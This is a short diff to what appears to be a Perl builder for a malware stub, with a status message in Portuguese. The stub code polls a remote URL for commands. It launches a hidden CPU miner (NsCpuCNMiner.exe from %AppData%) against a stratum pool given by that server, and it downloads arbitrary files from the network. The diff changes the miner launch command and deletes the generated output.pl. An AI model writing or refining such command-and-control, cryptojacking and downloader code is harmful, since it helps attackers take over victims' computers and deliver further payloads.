@@ -114,7 +114,7 @@ while(1){
   }
   my \$response = \$ua->get(\"$_[0]\");
   if(\$response->decoded_content =~ m/miner->host:(.+);email:(.+);|miner->host:(.+),email:(.+);/){
-    system(\"%AppData%\\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
+    system(\"cd %AppData% && \\\\NsCpuCNMiner.exe -o stratum+tcp:\/\/\$1 -u \$2 -p x\");
   }
   if(\$response->decoded_content =~ m/download:(.+),(.+);/){
     getstore(\"\$1\", \"\$2\");
@@ -156,5 +156,6 @@ EXE
   else{
     print "\n[", color("YELLOW"),"!",color("reset"), "] Somente as versoes 5.24.1 e 5.24.0 sao suportadas !\n";
   }
+  unlink "output.pl";
   sleep 3;
 }
